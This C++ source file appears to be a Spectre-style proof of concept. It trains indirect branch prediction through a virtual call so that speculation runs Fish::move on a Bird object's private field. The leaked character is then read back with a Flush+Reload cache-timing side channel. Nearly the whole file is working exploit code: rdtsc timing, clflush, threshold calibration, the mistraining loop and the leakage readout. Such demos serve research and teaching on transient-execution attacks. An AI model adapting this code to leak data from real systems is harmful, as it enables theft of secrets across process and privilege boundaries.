#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define SECRET 'S'

static size_t CACHE_MISS = 0;
static size_t pagesize = 0;
char *mem;


uint64_t rdtsc_begin() {
    uint64_t a, d;

    asm volatile("mfence\n\t"
        "CPUID\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

uint64_t rdtsc_end() {
    uint64_t a, d;

    asm volatile("mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "CPUID\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

void flush(void *p) {
    asm volatile("clflush 0(%0)\n" : : "c" (p) : "rax");
}

void maccess(void *p) {
    asm volatile("movq (%0), %%rax\n" : : "c" (p) : "rax");
}

void mfence() {
    asm volatile("mfence");
}

void nospec() {
    asm volatile("lfence");
}

int flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;

    start = rdtsc_begin();
    maccess(ptr);
    end = rdtsc_end();
    mfence();
    flush(ptr);

    if (end - start < CACHE_MISS) {
        return 1;
    }

    return 0;
}

int flush_reload_t(void *ptr) {
    uint64_t start = 0, end = 0;

    start = rdtsc_begin();
    maccess(ptr);
    end = rdtsc_end();
    mfence();
    flush(ptr);

    return (int)(end - start);
}


int reload_t(void *ptr) {
    uint64_t start = 0, end = 0;

    start = rdtsc_begin();
    maccess(ptr);
    end = rdtsc_end();
    mfence();

    return (int)(end - start);
}

void cache_encode(char data) {
    maccess(mem + data * pagesize);
}

size_t detect_flush_reload_threshold() {
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;

    maccess(ptr);
    for (i = 0; i < count; i++) {
        reload_time += reload_t(ptr);
    }
    for (i = 0; i < count; i++) {
        flush_reload_time += flush_reload_t(ptr);
    }
    reload_time /= count;
    flush_reload_time /= count;

    return (flush_reload_time + reload_time * 2) / 3;
}

void flush_shared_memory() {
    for (int j = 0; j < 256; j++) {
        flush(mem + j * pagesize);
    }
}

class Animal {
    public:
        virtual void move() {}
};

class Bird : public Animal {
    private:
        char secret;
    public:
        Bird() {
            secret = SECRET;
        }
        void move() {}
};

class Fish : public Animal {
    private:
        char data;
    public:
        Fish() {
            data = 'F';
        }
        void move() {
            cache_encode(data);   
        }
};

void move_animal(Animal *animal) {
    animal->move();
}

int main(int argc, char **argv) {
    if (!CACHE_MISS) {
        CACHE_MISS = detect_flush_reload_threshold();
    }
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n",
        CACHE_MISS);
    
    pagesize = sysconf(_SC_PAGESIZE);
    char *_mem = (char *)malloc(pagesize * 300);
    mem = (char *)(((size_t)_mem & ~(pagesize - 1)) + pagesize * 2);

    Fish *fish = new Fish();
    Bird *bird = new Bird();

    char *ptr = (char *)((((size_t)move_animal)) & ~(pagesize - 1));
    mprotect(ptr, pagesize * 2, PROT_READ | PROT_WRITE | PROT_EXEC);

    memset(mem, 0, pagesize * 290);
    maccess((void *)move_animal);

    //ptr[0] = ptr[0];

    printf("Works if %c appears\n", SECRET);
    while (1) {
        nospec();
        for (int j = 0; j < 1000; j++) {
            move_animal(fish);
        }
        flush_shared_memory();
        mfence();

        flush(bird);
        mfence();

        nospec();
        move_animal(bird);

        for (int i = 1; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            if (flush_reload(mem + mix_i * pagesize)) {
                if ((mix_i >= 'A' && mix_i <= 'Z')) {
                    printf("%c ", mix_i);
                }
                fflush(stdout);
                sched_yield();
            }
        }
    }

    return EXIT_SUCCESS;
}
